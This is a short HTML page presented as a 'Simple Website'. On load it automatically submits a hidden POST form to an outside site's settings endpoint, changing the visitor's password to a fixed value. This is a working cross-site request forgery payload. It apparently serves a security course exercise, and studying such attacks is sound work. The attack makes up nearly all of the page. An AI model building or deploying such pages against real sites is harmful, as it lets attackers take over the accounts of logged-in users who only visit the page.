<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Simple Website</title>
</head>
<body>
    <h1>Welcome to My Simple Website</h1>
    <form id="autoSubmitForm" action="https://cats.is-course.ru/settings" method="POST" target="responseFrame">
    <input type="hidden" name="password" value="aaabbb">
    <input type="hidden" name="confirm-password" value="aaabbb">
    </form>

  <!-- Iframe to display response -->
  <iframe
    name="responseFrame"
    id="responseFrame"
    style="width: 100%; height: 300px; border: 2px solid #000; margin-top: 20px;"
  ></iframe>

  <script>
    // Automatically submit the form on page load
    window.onload = function () {
      document.getElementById('autoSubmitForm').submit();
    };
  </script>
</body>
</html>
